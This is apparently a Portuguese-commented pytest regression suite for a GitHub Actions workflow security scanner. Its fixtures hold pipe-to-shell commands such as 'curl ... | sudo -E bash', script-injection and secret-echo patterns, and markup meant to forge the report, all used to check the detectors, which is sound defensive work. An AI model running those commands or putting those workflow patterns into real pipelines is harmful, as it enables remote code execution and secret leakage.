"""Regressões da auditoria adversarial de 2026-07-29.

Cada teste aqui falha se a correção correspondente for desfeita — foi assim que cada um foi
validado (mutação aplicada, pytest vermelho, mutação revertida). Os defeitos desta rodada
eram, na maioria, invisíveis para a suíte anterior: ela ficava 122/122 verde com o código de
produção sabotado.
"""

from __future__ import annotations

import io
import json
import textwrap
import time
from pathlib import Path

import pytest
from rich.console import Console
from typer.testing import CliRunner

import esteira.checks.engine as engine_mod
from esteira.checks.detectors import _CURL_PIPE, _EXPR
from esteira.checks.engine import scan
from esteira.cli import app
from esteira.core.models import Finding, ScanResult, Severity
from esteira.report.console import render
from esteira.report.json_report import to_document
from esteira.report.sarif import to_sarif

runner = CliRunner()
_SHA = "b4ffde65f46336ab88eb53be808477a3936bae11"


def _escrever(tmp_path: Path, texto: str, nome: str = "w.yml") -> Path:
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True, exist_ok=True)
    (wf_dir / nome).write_text(texto, encoding="utf-8")
    return tmp_path


def _achados(tmp_path: Path, texto: str, cid: str | None = None) -> list[Finding]:
    todos = scan(_escrever(tmp_path, texto)).findings
    return [f for f in todos if cid is None or f.check_id == cid]


def _ids(tmp_path: Path, texto: str) -> set[str]:
    return {f.check_id for f in _achados(tmp_path, texto)}


def _linhas(texto: str, achados: list[Finding]) -> list[str]:
    corpo = texto.splitlines()
    return [corpo[f.line - 1].strip() for f in achados]


# =========================================================================== #
# ReDoS — a ferramenta que audita o pipeline não pode ser o DoS do pipeline.
# =========================================================================== #

# Orçamento MUITO folgado de propósito: a forma corrigida leva ~0,00002 s, e a quebrada
# levava 7,1 s nesta mesma entrada. Qualquer valor entre os dois separa os dois mundos sem
# depender da velocidade do runner.
_ORCAMENTO_S = 0.5


def test_curl_pipe_nao_tem_backtracking_exponencial() -> None:
    """`_WRAPPERS` com quantificador aninhado ilimitado explodia: 129 caracteres = 7,1 s.

    Um `run:` de ~160 caracteres num PR de fork travava o job de auditoria por horas — DoS
    do portão de segurança e supressão da auditoria a custo zero para o atacante.
    """
    hostil = "sudo env time nice " * 6 + "curl http://x |"
    inicio = time.perf_counter()
    _CURL_PIPE.search(hostil)
    assert time.perf_counter() - inicio < _ORCAMENTO_S


def test_curl_pipe_continua_detectando_wrappers_legitimos(tmp_path: Path) -> None:
    """A correção não pode ser 'ficou rápido porque parou de achar'."""
    for cmd in (
        "curl -fsSL https://x.invalid/i.sh | sudo -E bash",
        "wget -qO- https://x.invalid/i.sh |& zsh",
        "timeout 30 curl https://x.invalid | bash",
        "env FOO=1 curl https://x.invalid | /usr/bin/bash",
        "curl -fsSL https://x.invalid | base64 -d | bash",
    ):
        wf = f"on: push\npermissions: {{}}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {cmd}\n"
        assert "curl-pipe-shell" in _ids(tmp_path, wf), cmd


def test_expr_nao_e_quadratico_com_abertura_sem_fechamento() -> None:
    """`${{` sem `}}` fazia o motor varrer o resto do texto a cada abertura.

    Medido: 200 KB de `${{ ` levavam 130 s. O teste antigo usava 8 KB (0,25 s) e passava.
    """
    hostil = "${{ " * 8000
    inicio = time.perf_counter()
    assert _EXPR.findall(hostil) == []
    assert time.perf_counter() - inicio < _ORCAMENTO_S


def test_expr_separa_expressoes_vizinhas() -> None:
    """`}}` era consumível como conteúdo: N expressões viravam UM match só.

    Consequência real: três injeções no mesmo `run:` chegavam como um achado (dois
    desapareciam) e a evidência saía como um blob multi-linha.
    """
    assert _EXPR.findall("${{ secrets.A }} e ${{ secrets.B }}") == [" secrets.A ", " secrets.B "]


def test_expr_ainda_cobre_format_com_chaves_escapadas() -> None:
    achado = _EXPR.findall("echo ${{ format('{{ {0} }}', github.event.issue.title) }}")
    assert achado == [" format('{{ {0} }}', github.event.issue.title) "]


# =========================================================================== #
# secret-in-run — falsos-negativos da heurística de redirecionamento.
# =========================================================================== #

_ECHO_COM_SETA = 'echo "==> publicando com ${{ secrets.API_TOKEN }}"'
_ECHO_STDERR_MUDO = 'echo "token=${{ secrets.API_TOKEN }}" 2>/dev/null'


@pytest.mark.parametrize("cmd", [_ECHO_COM_SETA, _ECHO_STDERR_MUDO])
def test_secret_in_run_pega_segredo_que_vai_para_o_stdout(tmp_path: Path, cmd: str) -> None:
    """O `>` dentro da string ecoada e o `2>` de stderr NÃO são gravação em arquivo.

    Nos dois casos o segredo vai inteiro para o log da Action, e os dois são idiomas banais
    de script de deploy — o cliente recebia 'pipeline limpo' com o token no log público.
    """
    wf = f"on: push\npermissions: {{}}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {cmd}\n"
    assert "secret-in-run" in _ids(tmp_path, wf)


@pytest.mark.parametrize(
    "cmd",
    [
        "printf '%s' \"${{ secrets.KEY }}\" > id_deploy",
        'echo "${{ secrets.X }}" >> "$GITHUB_ENV"',
        'echo "${{ secrets.REGISTRY_PASSWORD }}" | docker login -u x --password-stdin',
    ],
)
def test_secret_in_run_nao_alarma_no_padrao_seguro(tmp_path: Path, cmd: str) -> None:
    """Gravar o segredo em arquivo / mandar para o stdin não vaza: continua sem alarme."""
    wf = f"on: push\npermissions: {{}}\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {cmd}\n"
    assert "secret-in-run" not in _ids(tmp_path, wf)


def test_secret_in_run_cobre_o_sink_do_github_script(tmp_path: Path) -> None:
    """`console.log` de segredo no `github-script` vai para o log igual a um `echo`."""
    wf = textwrap.dedent("""\
        on: issues
        permissions: {}
        jobs:
          b:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/github-script@v7
                with:
                  script: console.log("token=${{ secrets.API_TOKEN }}")
    """)
    assert "secret-in-run" in _ids(tmp_path, wf)


# =========================================================================== #
# script-injection — linha do achado (é o carro-chefe e vai para a aba Security).
# =========================================================================== #


def test_injecao_aponta_para_o_run_e_nao_para_a_mitigacao(tmp_path: Path) -> None:
    """O achado CRÍTICO apontava para a linha onde o mantenedor fez a coisa CERTA."""
    wf = textwrap.dedent("""\
        on: issues
        permissions: {}
        jobs:
          seguro:
            runs-on: ubuntu-latest
            steps:
              - env:
                  TITLE: ${{ github.event.issue.title }}
                run: echo "$TITLE"
          vulneravel:
            runs-on: ubuntu-latest
            steps:
              - run: echo "${{ github.event.issue.title }}"
    """)
    achados = _achados(tmp_path, wf, "script-injection")
    assert len(achados) == 1
    assert _linhas(wf, achados) == ['- run: echo "${{ github.event.issue.title }}"']


def test_tres_injecoes_produzem_tres_linhas_distintas(tmp_path: Path) -> None:
    """Mesmo ruleId + mesma location + mesma message ⇒ o Code Scanning funde em 1 alerta."""
    wf = textwrap.dedent("""\
        on: issues
        permissions: {}
        jobs:
          b:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  echo "1 ${{ github.event.issue.title }}"
                  echo "2 ${{ github.event.issue.title }}"
                  echo "3 ${{ github.event.issue.title }}"
    """)
    achados = _achados(tmp_path, wf, "script-injection")
    assert len(achados) == 3
    assert len({f.line for f in achados}) == 3


def test_dois_vazamentos_de_segredo_produzem_duas_linhas(tmp_path: Path) -> None:
    wf = textwrap.dedent("""\
        on: push
        permissions: {}
        jobs:
          b:
            runs-on: ubuntu-latest
            steps:
              - run: |
                  echo "a=${{ secrets.A }}"
                  echo "b=${{ secrets.B }}"
    """)
    achados = _achados(tmp_path, wf, "secret-in-run")
    assert len({f.line for f in achados}) == 2


@pytest.mark.parametrize(
    "ctx",
    [
        "github.event.pull_request.head.repo.description",
        "github.event.pull_request.head.repo.homepage",
    ],
)
def test_contextos_de_texto_livre_do_fork_sao_nao_confiaveis(tmp_path: Path, ctx: str) -> None:
    """Constam da lista oficial do GitHub e o autor do fork os controla integralmente."""
    wf = (
        "on: pull_request_target\npermissions: {}\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
        '    steps:\n      - run: echo "${{ ' + ctx + ' }}"\n'
    )
    assert "script-injection" in _ids(tmp_path, wf)


# =========================================================================== #
# supressão inline — tem de ser escopada à linha marcada.
# =========================================================================== #


def test_supressao_no_workflow_nao_apaga_achado_de_job(tmp_path: Path) -> None:
    """Um `# esteira: ignore` apagava os três `broad-permissions`, inclusive os de JOB.

    Quem marca uma linha como revisada não está declarando o arquivo inteiro seguro.
    """
    wf = textwrap.dedent("""\
        on: push
        permissions: write-all  # esteira: ignore
        jobs:
          a:
            runs-on: ubuntu-latest
            permissions: write-all
            steps:
              - run: echo a
          b:
            runs-on: ubuntu-latest
            permissions: write-all
            steps:
              - run: echo b
    """)
    achados = _achados(tmp_path, wf, "broad-permissions")
    assert len(achados) == 2  # os dois de job sobrevivem; só o do workflow foi suprimido
    assert len({f.line for f in achados}) == 2
    assert all("write-all" in linha for linha in _linhas(wf, achados))


# =========================================================================== #
# composite action — o suporte existia nos detectores e era inalcançável.
# =========================================================================== #

_ACTION_VULNERAVEL = textwrap.dedent("""\
    name: deploy
    runs:
      using: composite
      steps:
        - run: echo "${{ github.event.issue.title }}"
          shell: bash
        - uses: some-org/evil@v1
""")


@pytest.mark.parametrize(
    "rel", ["action.yml", ".github/actions/deploy/action.yml", ".github/actions/build/action.yaml"]
)
def test_composite_action_e_descoberta_pelo_loader(tmp_path: Path, rel: str) -> None:
    """O loader só olhava `.github/workflows/`: o action.yml nunca era varrido.

    Composite action é justamente onde a injeção se esconde melhor — ela é chamada por N
    workflows e ninguém revisa o arquivo.
    """
    alvo = tmp_path / rel
    alvo.parent.mkdir(parents=True, exist_ok=True)
    alvo.write_text(_ACTION_VULNERAVEL, encoding="utf-8")
    ids = {f.check_id for f in scan(tmp_path).findings}
    assert {"script-injection", "unpinned-action-thirdparty"} <= ids
    assert "missing-permissions" not in ids  # arquivo de action não tem bloco 'permissions'


def test_action_yml_de_dependencia_vendorada_nao_e_auditado(tmp_path: Path) -> None:
    (tmp_path / "node_modules" / "dep").mkdir(parents=True)
    (tmp_path / "node_modules" / "dep" / "action.yml").write_text(
        _ACTION_VULNERAVEL, encoding="utf-8"
    )
    assert scan(tmp_path).files_scanned == 0


# =========================================================================== #
# checkout-credentials-in-artifact (classe 'artipacked')
# =========================================================================== #


def _job_checkout_upload(checkout_with: str = "", upload_with: str = "          path: .\n") -> str:
    return (
        "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
        f"    steps:\n      - uses: actions/checkout@{_SHA}\n{checkout_with}"
        f"      - uses: actions/upload-artifact@{_SHA}\n        with:\n          name: build\n"
        f"{upload_with}"
    )


def test_checkout_com_upload_do_workspace_e_apontado(tmp_path: Path) -> None:
    """checkout grava o token em .git/config; o upload do workspace publica o .git junto."""
    achados = _achados(tmp_path, _job_checkout_upload(), "checkout-credentials-in-artifact")
    assert len(achados) == 1
    assert achados[0].severity is Severity.HIGH


def test_checkout_mitigado_nao_e_apontado(tmp_path: Path) -> None:
    wf = _job_checkout_upload("        with:\n          persist-credentials: false\n")
    assert "checkout-credentials-in-artifact" not in _ids(tmp_path, wf)


def test_upload_de_caminho_restrito_nao_e_apontado(tmp_path: Path) -> None:
    """Sem publicar a raiz do workspace não há vazamento — não pode virar ruído."""
    wf = _job_checkout_upload(upload_with="          path: dist/\n")
    assert "checkout-credentials-in-artifact" not in _ids(tmp_path, wf)


def test_checkout_sem_upload_nenhum_nao_e_apontado(tmp_path: Path) -> None:
    """O checkout padrão é o de 99% dos workflows: sozinho ele não é achado."""
    wf = (
        "on: push\npermissions:\n  contents: read\njobs:\n  b:\n    runs-on: ubuntu-latest\n"
        f"    steps:\n      - uses: actions/checkout@{_SHA}\n      - run: echo oi\n"
    )
    assert "checkout-credentials-in-artifact" not in _ids(tmp_path, wf)


# =========================================================================== #
# caminhos relativos — o GitHub descarta resultado de SARIF com URI absoluta.
# =========================================================================== #


def test_caminho_do_achado_e_relativo_a_raiz_da_varredura(tmp_path: Path) -> None:
    """Com URI absoluta o Code Scanning ACEITA o SARIF e ignora os alertas, sem erro visível."""
    wf = "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo oi\n"
    documento = json.loads(to_sarif(scan(_escrever(tmp_path, wf))))
    uris = {
        r["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
        for r in documento["runs"][0]["results"]
    }
    assert uris == {".github/workflows/w.yml"}


def test_caminho_relativo_tambem_quando_o_alvo_e_o_arquivo(tmp_path: Path) -> None:
    wf = "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo oi\n"
    _escrever(tmp_path, wf)
    alvo = tmp_path / ".github" / "workflows" / "w.yml"
    assert {f.path for f in scan(alvo).findings} == {"w.yml"}


# =========================================================================== #
# contrato SARIF — o campo que decide como o GitHub prioriza o alerta.
# =========================================================================== #

_WF_CRITICO = textwrap.dedent("""\
    on: issues
    permissions:
      contents: read
    jobs:
      b:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.issue.title }}"
""")


def test_sarif_declara_nivel_e_security_severity_coerentes(tmp_path: Path) -> None:
    """`test_sarif_structure` validava o esqueleto e NADA sobre nível/severidade.

    Com CRITICAL e HIGH mapeados para 'note', todo achado crítico chegava à aba Security do
    cliente como nota e o filtro de severidade do Code Scanning parava de funcionar — com a
    suíte inteira verde.
    """
    documento = json.loads(to_sarif(scan(_escrever(tmp_path, _WF_CRITICO))))
    regras = {r["id"]: r for r in documento["runs"][0]["tool"]["driver"]["rules"]}
    esperado = {
        Severity.CRITICAL: "error",
        Severity.HIGH: "error",
        Severity.MEDIUM: "warning",
        Severity.LOW: "note",
        Severity.INFO: "note",
    }
    from esteira.checks.catalog import CATALOG

    for cid, meta in CATALOG.items():
        regra = regras[cid]
        assert regra["defaultConfiguration"]["level"] == esperado[meta.severity], cid
        assert float(regra["properties"]["security-severity"]) > 0, cid

    resultado = next(
        r for r in documento["runs"][0]["results"] if r["ruleId"] == "script-injection"
    )
    assert resultado["level"] == "error"
    assert float(regras["script-injection"]["properties"]["security-severity"]) >= 9.0


def test_sarif_emite_um_fingerprint_por_achado(tmp_path: Path) -> None:
    """Sem `partialFingerprints` o Code Scanning fecha e reabre o alerta a cada commit."""
    wf = textwrap.dedent("""\
        on: push
        permissions:
          contents: read
        jobs:
          b:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
              - uses: actions/setup-python@v5
    """)
    documento = json.loads(to_sarif(scan(_escrever(tmp_path, wf))))
    resultados = documento["runs"][0]["results"]
    assert len(resultados) == 2
    impressoes = [r["partialFingerprints"] for r in resultados]
    assert all(set(fp) == {"esteiraFindingId/v1"} for fp in impressoes)
    # dois achados distintos (checkout e setup-python) não podem colidir
    assert len({fp["esteiraFindingId/v1"] for fp in impressoes}) == 2


def test_achados_repetidos_e_identicos_nao_colidem(tmp_path: Path) -> None:
    """Dois `actions/checkout@v4` no mesmo arquivo têm id, caminho e evidência IGUAIS.

    Com o mesmo fingerprint, um consumidor que deduplica por (ruleId, fingerprint, arquivo)
    funde os dois num alerta só — perda de achado real dentro do entregável.
    """
    wf = textwrap.dedent("""\
        on: push
        permissions:
          contents: read
        jobs:
          a:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
          b:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
    """)
    resultados = json.loads(to_sarif(scan(_escrever(tmp_path, wf))))["runs"][0]["results"]
    assert len(resultados) == 2
    assert len({r["partialFingerprints"]["esteiraFindingId/v1"] for r in resultados}) == 2


def test_fingerprint_nao_muda_quando_o_workflow_e_reindentado(tmp_path: Path) -> None:
    """A linha fica FORA do hash de propósito: reindentar não pode churnar o alerta."""

    def impressao(texto: str, destino: Path) -> str:
        documento = json.loads(to_sarif(scan(_escrever(destino, texto))))
        return documento["runs"][0]["results"][0]["partialFingerprints"]["esteiraFindingId/v1"]

    antes = impressao(_WF_CRITICO, tmp_path / "a")
    depois = impressao("\n\n" + _WF_CRITICO, tmp_path / "b")
    assert antes == depois


def test_sarif_carrega_a_evidencia(tmp_path: Path) -> None:
    documento = json.loads(to_sarif(scan(_escrever(tmp_path, _WF_CRITICO))))
    regiao = documento["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["region"]
    assert "github.event.issue.title" in regiao["snippet"]["text"]


# =========================================================================== #
# contrato JSON da suíte
# =========================================================================== #


def test_json_declara_schema_e_edicao_do_owasp(tmp_path: Path) -> None:
    documento = to_document(scan(_escrever(tmp_path, _WF_CRITICO)))
    assert documento["schema"] == "suite-appsec/1"
    assert documento["owasp_edition"] == "2025"


def test_by_severity_sempre_traz_as_cinco_chaves(tmp_path: Path) -> None:
    """`.by_severity.high` estourava KeyError quando a varredura vinha limpa."""
    limpo = to_document(ScanResult(findings=[], files_scanned=1))
    assert set(limpo["summary"]["by_severity"]) == {s.value for s in Severity}
    assert limpo["summary"]["by_severity"]["high"] == 0

    sujo = to_document(scan(_escrever(tmp_path, _WF_CRITICO)))
    assert set(sujo["summary"]["by_severity"]) == {s.value for s in Severity}


def test_chave_do_achado_e_id(tmp_path: Path) -> None:
    documento = to_document(scan(_escrever(tmp_path, _WF_CRITICO)))
    achado = documento["findings"][0]
    assert achado["id"] == "script-injection"
    assert achado["severity"] == "critical"
    assert achado["severity_rank"] == Severity.CRITICAL.rank


# =========================================================================== #
# relatório de console — entrada hostil não pode derrubar nem forjar o relatório.
# =========================================================================== #


def test_dado_do_alvo_nao_e_interpretado_como_marcacao(tmp_path: Path) -> None:
    """Um job chamado `[/]` derrubava o relatório com MarkupError DEPOIS da varredura.

    A varredura roda inteira, encontra os achados e morre na hora de mostrar: supressão de
    detecção a custo zero. E `[bold green]` num campo externo forjava texto no relatório.
    """
    wf = 'on: push\njobs:\n  "[/] [bold green]TUDO CERTO[/]":\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo oi\n'
    resultado = scan(_escrever(tmp_path, wf))
    assert resultado.findings  # a varredura achou algo…

    console = Console(file=io.StringIO(), width=200)
    render(resultado, console)  # …e o relatório NÃO levanta
    saida = console.file.getvalue()  # type: ignore[attr-defined]
    assert "[/]" in saida  # o texto sai LITERAL, não interpretado
    assert "[bold green]" in saida


def test_plano_de_acao_mostra_a_correcao(tmp_path: Path) -> None:
    """A `fix_suggestion` é o ativo mais valioso da ferramenta e só saía no JSON/SARIF."""
    console = Console(file=io.StringIO(), width=200)
    render(scan(_escrever(tmp_path, _WF_CRITICO)), console)
    saida = console.file.getvalue()  # type: ignore[attr-defined]
    assert "Plano de ação" in saida
    assert "env indirection" in saida


def test_cli_com_dado_hostil_no_alvo_nao_quebra(tmp_path: Path) -> None:
    wf = 'on: push\njobs:\n  "[/]":\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo oi\n'
    resultado = runner.invoke(app, ["scan", str(_escrever(tmp_path, wf))])
    assert resultado.exit_code == 0
    assert resultado.exception is None


# =========================================================================== #
# portão de CI: severidade + --fail-on é a defesa inteira da ferramenta.
# =========================================================================== #


def test_injecao_critica_reprova_o_ci(tmp_path: Path) -> None:
    alvo = _escrever(tmp_path, _WF_CRITICO)
    for limiar in ("high", "critical"):
        resultado = runner.invoke(app, ["scan", str(alvo), "--fail-on", limiar])
        assert resultado.exit_code == 1, limiar


def test_achado_baixo_nao_reprova_no_limiar_alto(tmp_path: Path) -> None:
    wf = "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo oi\n"
    resultado = runner.invoke(app, ["scan", str(_escrever(tmp_path, wf))])
    assert resultado.exit_code == 0  # só missing-permissions (LOW) com --fail-on high


def test_fail_on_info_existe_e_reprova_no_nivel_mais_baixo(tmp_path: Path) -> None:
    wf = "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo oi\n"
    resultado = runner.invoke(app, ["scan", str(_escrever(tmp_path, wf)), "--fail-on", "info"])
    assert resultado.exit_code == 1


# =========================================================================== #
# fail-closed: nem exceção inesperada nem YAML quebrado podem virar 'limpo'.
# =========================================================================== #


def test_excecao_inesperada_vira_achado_e_nao_varredura_limpa(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """O comentário promete 'jamais deixando uma exceção derrubar a varredura'.

    Promessa escrita sem teste é opinião — e este repo já teve TypeError (job id não-string)
    e RecursionError (flow aninhado) reais dentro de `run_all`.
    """

    def explode(_wf: object) -> list[Finding]:
        raise RuntimeError("boom")

    wf = "on: push\npermissions:\n  contents: read\njobs: {}\n"
    alvo = _escrever(tmp_path, wf)
    monkeypatch.setattr(engine_mod, "run_all", explode)

    achados = scan(alvo).findings
    assert [f.check_id for f in achados] == ["invalid-yaml"]
    assert achados[0].severity is Severity.HIGH
    assert "RuntimeError" in achados[0].detail


# `jobs: [` abre uma sequência flow que nunca fecha: o PyYAML aborta e as checagens
# estruturais são puladas — é exatamente o cenário que o fallback existe para cobrir.
_YAML_QUEBRADO = textwrap.dedent("""\
    on: push
    jobs: [
      b:
        runs-on: self-hosted
        steps:
          - uses: alguem/acao@main
          - run: echo "${{ github.event.issue.title }}"
          - run: echo "tok=${{ secrets.API_TOKEN }}"
          - run: curl https://x.invalid/i.sh | bash
""")


def test_fallback_textual_ainda_acha_o_que_importa(tmp_path: Path) -> None:
    """~75 linhas de produção sem um único teste: apagá-las mantinha a suíte verde.

    O fallback existe porque o nosso parser falhar não significa que o workflow esteja
    quebrado para o GitHub — é a rede de segurança do `invalid-yaml`.
    """
    ids = _ids(tmp_path, _YAML_QUEBRADO)
    assert {
        "invalid-yaml",
        "script-injection",
        "unpinned-action-thirdparty",
        "secret-in-run",
        "curl-pipe-shell",
        "self-hosted-runner",
    } <= ids


def test_supressao_inline_vale_tambem_no_fallback(tmp_path: Path) -> None:
    texto = _YAML_QUEBRADO.replace(
        '- run: echo "${{ github.event.issue.title }}"',
        '- run: echo "${{ github.event.issue.title }}"  # esteira: ignore',
    )
    ids = _ids(tmp_path, texto)
    assert "invalid-yaml" in ids
    assert "script-injection" not in ids
